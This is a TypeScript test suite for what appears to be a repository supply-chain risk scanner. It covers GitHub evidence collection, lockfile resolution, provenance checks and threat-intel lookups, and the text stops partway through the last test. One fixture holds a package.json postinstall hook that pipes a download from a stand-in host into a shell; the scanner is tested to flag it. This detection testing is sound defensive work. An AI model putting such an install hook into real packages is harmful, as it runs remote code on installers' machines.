import { describe, expect, test } from "bun:test";
import { GitHubRepositoryProvider } from "../src/providers/github-repository.ts";
import { DepsDevProvider, normalizeProvenance } from "../src/providers/deps-dev.ts";
import { RiskEngine } from "../src/domain/risk-engine.ts";
import { extractRiskFeatures, RISK_FEATURE_SCHEMA_VERSION } from "../src/domain/risk-features.ts";
import { RISK_SNAPSHOT_SCHEMA_VERSION, type RiskSnapshot } from "../src/domain/risk.ts";
import { partitionCompatibleRows, featuresEqual, featuresEqualForCohort } from "../src/domain/risk-evaluation.ts";
import { UpstreamHttp } from "../src/providers/http.ts";
import { CachedLoader, type Cache } from "../src/data/cache.ts";
import { OmniIntelligence } from "../src/services.ts";
import { NoopAssessmentJournal, type AssessmentJournal } from "../src/data/assessment-journal.ts";
import type { ExactDependencyCoordinate, RiskAssessment, RepositoryEvidence, ThreatFinding } from "../src/domain/risk.ts";

function memoryCache(): Cache {
  const values = new Map<string, string>();
  return { async get(key) { return values.get(key) ?? null; }, async set(key, value) { values.set(key, value); } };
}

function fakeDepsDev(record: (coordinate: ExactDependencyCoordinate) => void): { packageVersion(coordinate: ExactDependencyCoordinate): Promise<{ observation: { coordinate: ExactDependencyCoordinate; licenses: string[]; advisoryIds: string[]; graph: { checked: boolean; nodeCount: number }; provenance: Array<{ package: ExactDependencyCoordinate; state: "UNAVAILABLE"; source: "deps.dev" }> }; evidence: { source: string; kind: string; observedAt: string; detail: Record<string, never> } }> } {
  return { async packageVersion(coordinate) {
    record(coordinate);
    return {
      observation: { coordinate, licenses: [], advisoryIds: [], graph: { checked: true, nodeCount: 1 }, provenance: [{ package: coordinate, state: "UNAVAILABLE", source: "deps.dev" }] },
      evidence: { source: "deps.dev", kind: "package_dependency_provenance", observedAt: "2026-01-01T00:00:00.000Z", detail: {} }
    };
  } };
}

const staticScorecard = { async repository() { return { score: 9.5, evidence: { source: "Scorecard", kind: "score", observedAt: "2026-01-01T00:00:00.000Z", detail: { score: 9.5 } } }; } };

function exactCoordinate(name: string, version = "1.0.0"): ExactDependencyCoordinate {
  return { ecosystem: "NPM", name, version, sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." };
}

function repositoryEvidenceWith(exact: ExactDependencyCoordinate[]): RepositoryEvidence {
  return {
    target: { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha },
    securityFiles: [],
    dependencies: { exact, unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } },
    dependencyObservations: [],
    dependencyThreatIntel: { status: "NOT_CHECKED", packagesInspected: [], findings: [], errors: [], limitations: [] },
    coverage: { status: "complete", treeEntriesInspected: 1, filesInspected: 1, bytesInspected: 10, limitations: [] },
    sourceErrors: []
  };
}

function threatIntelStore(lookup: (coordinate: ExactDependencyCoordinate) => Promise<{ checked: boolean; findings: ThreatFinding[] }>) {
  return {
    async lookupEndpoint() { return { checked: false, findings: [] }; },
    async lookupPackage(_ecosystem: string, name: string, version: string) { return lookup(exactCoordinate(name, version)); },
    async status() { return { available: true, configured: true, activeIndicators: 1, sources: 1 }; }
  };
}

function capturingJournal(snapshots: RiskSnapshot[]) {
  return {
    async record(snapshot: RiskSnapshot) { snapshots.push(structuredClone(snapshot)); return "assessment-id"; },
    async labelAssessment() {},
    async loadLabelled() { return []; }
  };
}

function repositoryOmni(repositoryEvidence: RepositoryEvidence, threatIntel: ReturnType<typeof threatIntelStore>, journal: AssessmentJournal = new NoopAssessmentJournal()) {
  const github = {
    async resolve() { return { repository: repositoryEvidence.target.repository, requestedRef: "main", resolvedCommitSha: commitSha, rootTreeSha: treeSha }; },
    async collectResolved() { return structuredClone(repositoryEvidence); }
  };
  const depsDev = fakeDepsDev(() => {});
  return new OmniIntelligence(new RiskEngine(), new CachedLoader(memoryCache()), {} as never, {} as never, staticScorecard as never, {} as never, {} as never, {} as never, {} as never, threatIntel as never, journal, github as never, depsDev as never);
}

function evidenceOf(assessment: RiskAssessment): RepositoryEvidence {
  const snapshotEvidence = assessment.evidence.find(item => item.kind === "repository_primary_evidence");
  if (!snapshotEvidence) throw new Error("repository_primary_evidence missing");
  // The service records coverage/limitations/collector errors on the primary
  // evidence detail; read them from there instead of the assessment type.
  const detail = snapshotEvidence.detail as { repository?: string; resolvedCommitSha?: string; coverage?: "complete" | "partial"; limitations?: string[]; collectorErrors?: string[] };
  return {
    target: { repository: detail.repository ?? "", ...(detail.resolvedCommitSha ? { resolvedCommitSha: detail.resolvedCommitSha } : {}) },
    securityFiles: [],
    dependencies: { exact: [], unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } },
    dependencyObservations: [],
    dependencyThreatIntel: { status: "NOT_CHECKED", packagesInspected: [], findings: [], errors: [], limitations: [] },
    coverage: { status: detail.coverage ?? "partial", treeEntriesInspected: 0, filesInspected: 0, bytesInspected: 0, limitations: detail.limitations ?? [] },
    sourceErrors: detail.collectorErrors ?? []
  };
}

function response(value: unknown, status = 200): Response {
  return new Response(JSON.stringify(value), { status, headers: { "content-type": "application/json" } });
}
function content(value: string) { return { encoding: "base64", content: Buffer.from(value).toString("base64") }; }

const commitSha = "0123456789abcdef0123456789abcdef01234567";
const treeSha = "abcdef0123456789abcdef0123456789abcdef01";
const packageBlob = "1111111111111111111111111111111111111111";
const workflowBlob = "2222222222222222222222222222222222222222";

describe("repository evidence foundation", () => {
  test("resolves a mutable branch once and binds every security file read to its immutable commit", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const calls: string[] = [];
    const http = {
      async request(url: string | URL) {
        const target = String(url); calls.push(target);
        const fixtures: Record<string, unknown> = {
          [base]: { full_name: "acme/demo", default_branch: "main" },
          [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
          [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
            { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
            { path: ".github/workflows/release.yml", type: "blob", sha: workflowBlob, size: 100 }
          ] },
          [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { safe: "^1.2.0" }, scripts: { postinstall: "curl https://bad.example/install | sh" } })),
          [`${base}/contents/.github%2Fworkflows%2Frelease.yml?ref=${commitSha}`]: content("permissions: write-all\nsteps:\n  - uses: actions/checkout@v4\n")
        };
        return response(fixtures[target] ?? { message: "not found" }, fixtures[target] === undefined ? 404 : 200);
      }
    };

    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");

    expect(result.target).toEqual({ repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha });
    expect(result.coverage.status).toBe("partial");
    expect(result.dependencies.exact).toEqual([]);
    expect(result.dependencies.unresolved).toEqual([{ ecosystem: "NPM", name: "safe", requirement: "^1.2.0", manifestPath: "package.json", workspacePath: "." }]);
    expect(result.securityFiles.flatMap(file => file.findings)).toEqual(expect.arrayContaining(["INSTALL_LIFECYCLE_SCRIPT", "DOWNLOAD_EXECUTE_PATTERN", "WORKFLOW_WRITE_PERMISSION", "MUTABLE_GITHUB_ACTION_REF"]));
    expect(calls).toEqual(expect.arrayContaining([`${base}/contents/package.json?ref=${commitSha}`, `${base}/contents/.github%2Fworkflows%2Frelease.yml?ref=${commitSha}`]));
    expect(calls).not.toContain(`${base}/contents/package.json?ref=main`);
  });


  test("resolves the mutable ref on each call but collects a cached immutable repository only once", async () => {
    let resolveCalls = 0;
    let collectionCalls = 0;
    const repositoryEvidence = {
      target: { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha },
      securityFiles: [],
      dependencies: { exact: [], unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } },
      provenance: [],
      coverage: { status: "complete" as const, treeEntriesInspected: 0, filesInspected: 0, bytesInspected: 0, limitations: [] },
      sourceErrors: []
    };
    const github = {
      async resolve() { resolveCalls += 1; return { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha, rootTreeSha: treeSha }; },
      async collectResolved() { collectionCalls += 1; return structuredClone(repositoryEvidence); }
    };
    const values = new Map<string, string>();
    const cache: Cache = { async get(key) { return values.get(key) ?? null; }, async set(key, value) { values.set(key, value); } };
    const scorecard = { async repository() { return { score: 9.5, evidence: { source: "Scorecard", kind: "score", observedAt: "2026-01-01T00:00:00.000Z", detail: { score: 9.5 } } }; } };
    const omni = new OmniIntelligence(new RiskEngine(), new CachedLoader(cache), {} as never, {} as never, scorecard as never, {} as never, {} as never, {} as never, {} as never, {} as never, new NoopAssessmentJournal(), github as never, {} as never);

    await omni.repositoryRisk("acme", "demo");
    await omni.repositoryRisk("acme", "demo");

    expect(resolveCalls).toBe(2);
    expect(collectionCalls).toBe(1);
  });

  test("marks tree truncation and oversized files partial instead of claiming clean coverage", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = { async request(url: string | URL) {
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: true, tree: [{ path: "package.json", type: "blob", sha: packageBlob, size: 999_999 }] }
      };
      const target = String(url); return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.coverage).toMatchObject({ status: "partial", limitations: expect.arrayContaining(["github_tree_truncated", "security_file_oversized:package.json"]) });
    expect(result.securityFiles).toEqual([{ path: "package.json", category: "manifest", status: "oversized", findings: [] }]);
  });

  test("derives exact npm coordinates only from Bun lock resolution evidence", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const bunBlob = "3333333333333333333333333333333333333333";
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [{ path: "package.json", type: "blob", sha: packageBlob, size: 100 }, { path: "bun.lock", type: "blob", sha: bunBlob, size: 100 }] },
        [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { safe: "^1.2.0" } })),
        [`${base}/contents/bun.lock?ref=${commitSha}`]: content('"safe": ["safe@1.2.3", "", {}, "sha512-example"]')
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.dependencies.exact).toEqual([{ ecosystem: "NPM", name: "safe", version: "1.2.3", sourcePath: "bun.lock", manifestPath: "package.json", workspacePath: "." }]);
    expect(result.dependencies.unresolved).toEqual([]);
  });

  test("bounds deps.dev JSON bodies and disables redirects", async () => {
    const originalFetch = globalThis.fetch;
    const calls: RequestInit[] = [];
    globalThis.fetch = (async (_input, init) => {
      calls.push(init ?? {});
      return new Response(JSON.stringify({ ok: true }), { headers: { "content-type": "application/json" } });
    }) as typeof fetch;
    try {
      const http = new UpstreamHttp(1_000, 1, 1);
      await expect(http.boundedJson("https://api.deps.dev/example", 128)).resolves.toEqual({ ok: true });
      expect(calls[0]?.redirect).toBe("error");
      globalThis.fetch = (async () => new Response("0123456789", { headers: { "content-length": "10" } })) as unknown as typeof fetch;
      await expect(http.boundedJson("https://api.deps.dev/example", 4)).rejects.toThrow("upstream_response_oversized");
    } finally { globalThis.fetch = originalFetch; }
  });

  test("keeps deps.dev provenance states strict and source/commit mismatches visible", async () => {
    const urls: string[] = [];
    const http = { async boundedJson(url: string, _maximumBytes: number) { urls.push(url); return { licenses: ["MIT"], advisoryKeys: [{ id: "GHSA-example" }], slsaProvenances: [{ verified: true, sourceRepository: "github.com/acme/demo", commit: commitSha, url: "https://provenance.example/1" }] }; } };
    const observed = await new DepsDevProvider(http as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." }, { repository: "github.com/acme/demo", commit: commitSha });
    expect(urls).toContain("https://api.deps.dev/v3/systems/NPM/packages/demo/versions/1.0.0:dependencies");
    expect(observed.observation.provenance[0]).toMatchObject({ state: "VERIFIED", expectedSourceMatches: true, expectedCommitMatches: true });
    expect(normalizeProvenance({ verified: true, sourceRepository: "github.com/other/repo", commit: commitSha }, { repository: "github.com/acme/demo", commit: commitSha }).state).toBe("VERIFIED_SOURCE_MISMATCH");
    expect(normalizeProvenance({ verified: true, sourceRepository: "github.com/acme/demo", commit: "1111111111111111111111111111111111111111" }, { repository: "github.com/acme/demo", commit: commitSha }).state).toBe("VERIFIED_COMMIT_MISMATCH");
  });

  test("keeps repository dependency threat intel observation-only across checked, failed, and not-checked states", async () => {
    const baseline = new RiskEngine().assess({ subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: [{ source: "Scorecard", kind: "score", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }] });
    const coordinate = exactCoordinate("dangerous-package", "4.2.0");
    const finding: ThreatFinding = { indicatorType: "package", indicator: "npm:dangerous-package@4.2.0", threatType: "malicious_package", severity: "critical", source: "licensed-feed", reference: "https://intel.example/finding/1" };

    const checkedSnapshots: RiskSnapshot[] = [];
    const checked = await repositoryOmni(repositoryEvidenceWith([coordinate]), threatIntelStore(async () => ({ checked: true, findings: [finding] })), capturingJournal(checkedSnapshots)).repositoryRisk("acme", "demo");
    const checkedSnapshot = checkedSnapshots[0]!;
    const checkedObservation = checkedSnapshot.repositoryEvidence?.dependencyThreatIntel;
    expect({ riskScore: checked.riskScore, recommendation: checked.recommendation }).toEqual({ riskScore: baseline.riskScore, recommendation: baseline.recommendation });
    expect(checkedSnapshot).not.toHaveProperty("threatIntelChecked");
    expect(checkedSnapshot).not.toHaveProperty("threatFindings");
    expect(checkedSnapshot.sourceErrors ?? []).toEqual([]);
    expect(checkedObservation).toMatchObject({ status: "CHECKED", packagesInspected: [coordinate], findings: [{ coordinate, finding }], errors: [], limitations: [] });
    expect(checked.evidence.find(item => item.kind === "repository_dependency_ioc_lookup")?.detail).toMatchObject({ status: "CHECKED", packagesInspected: [coordinate], findings: [{ coordinate, finding }] });

    const failedSnapshots: RiskSnapshot[] = [];
    const failed = await repositoryOmni(repositoryEvidenceWith([coordinate]), threatIntelStore(async () => { throw new Error("feed_timeout"); }), capturingJournal(failedSnapshots)).repositoryRisk("acme", "demo");
    const failedSnapshot = failedSnapshots[0]!;
    expect({ riskScore: failed.riskScore, recommendation: failed.recommendation }).toEqual({ riskScore: baseline.riskScore, recommendation: baseline.recommendation });
    expect(failedSnapshot.sourceErrors ?? []).toEqual([]);
    expect(failedSnapshot.repositoryEvidence?.sourceErrors ?? []).toEqual([]);
    expect(failedSnapshot.repositoryEvidence?.dependencyThreatIntel).toMatchObject({ status: "UNAVAILABLE", packagesInspected: [coordinate], findings: [], errors: [`threat_intel NPM:${coordinate.name}@${coordinate.version}: feed_timeout`], limitations: [`threat_intel_lookup_failed:${coordinate.name}@${coordinate.version}`] });
    expect(failed.evidence.find(item => item.kind === "repository_dependency_ioc_lookup")?.detail).toMatchObject({ status: "UNAVAILABLE", errors: [`threat_intel NPM:${coordinate.name}@${coordinate.version}: feed_timeout`] });

    let zeroLookups = 0;
    const zeroSnapshots: RiskSnapshot[] = [];
    const zero = await repositoryOmni(repositoryEvidenceWith([]), threatIntelStore(async () => { zeroLookups += 1; return { checked: true, findings: [] }; }), capturingJournal(zeroSnapshots)).repositoryRisk("acme", "demo");
    expect({ riskScore: zero.riskScore, recommendation: zero.recommendation }).toEqual({ riskScore: baseline.riskScore, recommendation: baseline.recommendation });
    expect(zeroLookups).toBe(0);
    expect(zeroSnapshots[0]).not.toHaveProperty("threatIntelChecked");
    expect(zeroSnapshots[0]).not.toHaveProperty("threatFindings");
    expect(zeroSnapshots[0]?.repositoryEvidence?.dependencyThreatIntel).toMatchObject({ status: "NOT_CHECKED", packagesInspected: [], findings: [], errors: [], limitations: ["no_exact_dependencies_selected"] });
  });

  test("bounds repository threat-intel lookups to four concurrent calls and twenty-four total calls", async () => {
    const coordinates = Array.from({ length: 30 }, (_, index) => exactCoordinate(`package-${String(index).padStart(2, "2")}`, `1.0.${index}`));
    const snapshots: RiskSnapshot[] = [];
    let active = 0;
    let maximumActive = 0;
    const calls: string[] = [];
    const threatIntel = threatIntelStore(async coordinate => {
      active += 1;
      maximumActive = Math.max(maximumActive, active);
      calls.push(`${coordinate.name}@${coordinate.version}`);
      await new Promise(resolve => setTimeout(resolve, 2));
      active -= 1;
      return { checked: true, findings: [] };
    });
    const result = await repositoryOmni(repositoryEvidenceWith(coordinates), threatIntel, capturingJournal(snapshots)).repositoryRisk("acme", "demo");
    const observation = snapshots[0]?.repositoryEvidence?.dependencyThreatIntel;
    expect(maximumActive).toBeLessThanOrEqual(4);
    expect(calls).toHaveLength(24);
    expect(observation?.status).toBe("CHECKED");
    expect(observation?.packagesInspected).toHaveLength(24);
    expect(result.riskScore).toBe(new RiskEngine().assess({ subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: [{ source: "Scorecard", kind: "score", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }] }).riskScore);

    const secondSnapshots: RiskSnapshot[] = [];
    const secondCalls: string[] = [];
    const secondThreatIntel = threatIntelStore(async coordinate => { secondCalls.push(`${coordinate.name}@${coordinate.version}`); return { checked: true, findings: [] }; });
    await repositoryOmni(repositoryEvidenceWith([...coordinates].reverse()), secondThreatIntel, capturingJournal(secondSnapshots)).repositoryRisk("acme", "demo");
    expect(secondCalls).toEqual(calls);
  });

  test("preserves omni-risk-v1 score/recommendation with available or unavailable new evidence", () => {
    const base: RiskSnapshot = { subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: [{ source: "OpenSSF Scorecard", kind: "repository_security_practices", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }] };
    const evidence: RepositoryEvidence = { target: { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha }, securityFiles: [{ path: "package.json", category: "manifest" as const, status: "inspected" as const, findings: ["INSTALL_LIFECYCLE_SCRIPT"] }], dependencies: { exact: [], unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } }, dependencyObservations: [], dependencyThreatIntel: { status: "NOT_CHECKED", packagesInspected: [], findings: [], errors: [], limitations: [] }, coverage: { status: "complete" as const, treeEntriesInspected: 1, filesInspected: 1, bytesInspected: 10, limitations: [] }, sourceErrors: [] };
    const unavailable = { ...evidence, coverage: { ...evidence.coverage, status: "partial" as const, limitations: ["github_rate_limited"] }, sourceErrors: ["GitHub: github_rate_limited"] };
    const engine = new RiskEngine();
    const before = engine.assess(base);
    const available = engine.assess({ ...base, repositoryEvidence: evidence });
    const partial = engine.assess({ ...base, repositoryEvidence: unavailable });
    expect({ riskScore: available.riskScore, recommendation: available.recommendation }).toEqual({ riskScore: before.riskScore, recommendation: before.recommendation });
    expect({ riskScore: partial.riskScore, recommendation: partial.recommendation }).toEqual({ riskScore: before.riskScore, recommendation: before.recommendation });
    expect(available.signals.map(signal => signal.code)).toContain("INSTALL_LIFECYCLE_SCRIPT_OBSERVED");
    expect(partial.signals.map(signal => signal.code)).toContain("REPOSITORY_EVIDENCE_PARTIAL");
    expect(RISK_SNAPSHOT_SCHEMA_VERSION).toBe(2);
    expect(extractRiskFeatures({ ...base, repositoryEvidence: evidence }).schemaVersion).toBe(RISK_FEATURE_SCHEMA_VERSION);
  });

  test("replays v1 package and x402 rows safely but never reinterprets v1 repository rows", () => {
    const rows = [
      { snapshotSchemaVersion: 1, featureSchemaVersion: 1, subjectType: "package" as const, id: "old-package" },
      { snapshotSchemaVersion: 1, featureSchemaVersion: 1, subjectType: "x402_endpoint" as const, id: "old-endpoint" },
      { snapshotSchemaVersion: 1, featureSchemaVersion: 1, subjectType: "repository" as const, id: "old-repository" },
      { snapshotSchemaVersion: 2, featureSchemaVersion: 2, subjectType: "repository" as const, id: "current-repository" }
    ];
    expect(partitionCompatibleRows(rows, RISK_SNAPSHOT_SCHEMA_VERSION, RISK_FEATURE_SCHEMA_VERSION)).toEqual({
      compatible: [rows[0]!, rows[1]!, rows[3]!],
      incompatible: [rows[2]!],
      schemaVersionsPresent: { snapshot: [1, 2], feature: [1, 2] }
    });
  });

  test("legacy v1 feature replay is semantically compatible, not feature drift", () => {
    const packageSnapshot: RiskSnapshot = { subject: { type: "package", id: "npm:demo@1.0.0" }, vulnerabilities: [], exploitationChecked: true, threatIntelChecked: true, threatFindings: [], evidence: [] };
    const endpointSnapshot: RiskSnapshot = { subject: { type: "x402_endpoint", id: "https://example.com/pay" }, endpoint: { listedOnCircle: true, responseStatus: 402 }, activeProbeChecked: true, historyChecked: true, threatIntelChecked: true, threatFindings: [], evidence: [] };
    for (const snapshot of [packageSnapshot, endpointSnapshot]) {
      expect(extractRiskFeatures(snapshot).repository.present).toBe(false);
      const fresh = extractRiskFeatures(snapshot);
      // A persisted v1 feature row lacks schemaVersion and the repository block.
      const legacyRow: Record<string, unknown> = { ...fresh, schemaVersion: 1 } as unknown as Record<string, unknown>;
      delete legacyRow.repository;
      // Full-object comparison WOULD differ (that was the old false-drift behavior);
      // cohort-aware comparison must prove semantic equality instead.
      expect(featuresEqual(fresh, legacyRow)).toBe(false);
      expect(featuresEqualForCohort(fresh, legacyRow, 1)).toEqual({ equal: true, comparison: "legacy-projected" });
      // Real semantic change on the shared surface still counts as drift.
      const driftedLegacy = { ...legacyRow, vulnerabilityCount: 7 };
      expect(featuresEqualForCohort(fresh, driftedLegacy, 1)).toEqual({ equal: false, comparison: "legacy-projected" });
      // Current-cohort rows keep the strict byte-exact comparison.
      expect(featuresEqualForCohort(fresh, structuredClone(fresh), 2)).toEqual({ equal: true, comparison: "current-schema" });
      const mutatedCurrent = structuredClone(fresh) as unknown as Record<string, unknown>;
      mutatedCurrent.vulnerabilityCount = 3;
      expect(featuresEqualForCohort(fresh, mutatedCurrent, 2).equal).toBe(false);
    }
  });

  test("associates each workspace manifest with its own same-directory lock and preserves distinct coordinates", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const lock = (entries: Record<string, string>) => JSON.stringify({ packages: Object.fromEntries(Object.entries(entries).map(([name, version]) => [`node_modules/${name}`, { version }])) });
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "frontend/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "frontend/package-lock.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "backend/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "backend/package-lock.json", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { "root-dep": "^1.0.0" } })),
        [`${base}/contents/package-lock.json?ref=${commitSha}`]: content(lock({ "root-dep": "1.0.1" })),
        [`${base}/contents/frontend%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { shared: "^2.0.0" } })),
        [`${base}/contents/frontend%2Fpackage-lock.json?ref=${commitSha}`]: content(lock({ shared: "2.5.0" })),
        [`${base}/contents/backend%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { shared: "^3.0.0" } })),
        [`${base}/contents/backend%2Fpackage-lock.json?ref=${commitSha}`]: content(lock({ shared: "3.9.9" }))
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.dependencies.exact).toEqual([
      { ecosystem: "NPM", name: "shared", version: "3.9.9", sourcePath: "backend/package-lock.json", manifestPath: "backend/package.json", workspacePath: "backend" },
      { ecosystem: "NPM", name: "shared", version: "2.5.0", sourcePath: "frontend/package-lock.json", manifestPath: "frontend/package.json", workspacePath: "frontend" },
      { ecosystem: "NPM", name: "root-dep", version: "1.0.1", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." }
    ]);
    expect(result.dependencies.unresolved).toEqual([]);
    expect(result.coverage.status).toBe("complete");
  });

  test("never resolves declarations against an unrelated lockfile when association is unprovable", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "app/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "other/package-lock.json", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/app%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { demo: "^1.0.0" } })),
        [`${base}/contents/other%2Fpackage-lock.json?ref=${commitSha}`]: content(JSON.stringify({ packages: { "node_modules/demo": { version: "9.9.9" } } }))
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.dependencies.exact).toEqual([]);
    expect(result.dependencies.unresolved).toEqual([{ ecosystem: "NPM", name: "demo", requirement: "^1.0.0", manifestPath: "app/package.json", workspacePath: "app" }]);
    expect(result.coverage.limitations).toContain("dependency_lock_missing:app/package.json");
    expect(result.coverage.status).toBe("partial");
  });

  test("reports detected but unsupported dependency ecosystems instead of claiming coverage", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "pyproject.toml", type: "blob", sha: packageBlob, size: 100 },
          { path: "requirements-dev.txt", type: "blob", sha: packageBlob, size: 100 },
          { path: "Cargo.toml", type: "blob", sha: packageBlob, size: 100 },
          { path: "go.mod", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/pyproject.toml?ref=${commitSha}`]: content("[project]\n"),
        [`${base}/contents/requirements-dev.txt?ref=${commitSha}`]: content("requests==2.0.0\n"),
        [`${base}/contents/Cargo.toml?ref=${commitSha}`]: content("[dependencies]\n"),
        [`${base}/contents/go.mod?ref=${commitSha}`]: content("module example.com/demo\n")
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.coverage.limitations).toEqual(expect.arrayContaining(["dependency_resolution_unsupported:CARGO", "dependency_resolution_unsupported:GO", "dependency_resolution_unsupported:PYPI"]));
    expect(result.coverage.status).toBe("partial");
  });

  test("fails closed on invalid commit identities, rate limits, timeouts, and oversized streamed bodies", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const invalidIdentity = { async request() { return response({ default_branch: "main", sha: "not-a-sha", commit: { tree: {} } }); } };
    await expect(new GitHubRepositoryProvider(invalidIdentity as never).collect("acme", "demo")).rejects.toThrow("github_commit_identity_invalid");
    const rateLimited = { async request() { return response({}, 403); } };
    await expect(new GitHubRepositoryProvider(rateLimited as never).collect("acme", "demo")).rejects.toThrow("github_rate_limited");
    const timedOut = { async request() { throw new Error("upstream_timeout"); } };
    await expect(new GitHubRepositoryProvider(timedOut as never).collect("acme", "demo")).rejects.toThrow("upstream_timeout");
    const oversized = { async request(_url: string | URL, _init?: RequestInit) {
      const stream = new ReadableStream<Uint8Array>({
        start(controller) { controller.enqueue(new Uint8Array(MAX_STREAM_BYTES + 1)); controller.close(); }
      });
      return new Response(stream) as unknown as Response;
    } };
    await expect(new GitHubRepositoryProvider(oversized as never).collect("acme", "demo")).rejects.toThrow("github_response_oversized");
  });

  test("records missing and binary security files honestly instead of inspecting them", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const binaryContent = Buffer.from([0x7b, 0x00, 0x7d]).toString("base64");
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "missing/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "binary-package/package.json", type: "blob", sha: packageBlob, size: 3 },
          { path: "keepalive.yml", type: "blob", sha: workflowBlob, size: 10 }
        ] },
        [`${base}/contents/binary-package%2Fpackage.json?ref=${commitSha}`]: { encoding: "base64", content: binaryContent }
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.securityFiles).toEqual(expect.arrayContaining([
      { path: "missing/package.json", category: "manifest", status: "unsupported", findings: [] },
      { path: "binary-package/package.json", category: "manifest", status: "binary", findings: [] }
    ]));
    expect(result.coverage.limitations).toEqual(expect.arrayContaining(["github_http_404:missing/package.json", "security_file_binary:binary-package/package.json"]));
    expect(result.coverage.status).toBe("partial");
  });

  test("keeps malformed or unverifiable provenance explicit rather than dropping it", async () => {
    const http = { async boundedJson() { return { slsaProvenances: [{ verified: true }] }; } };
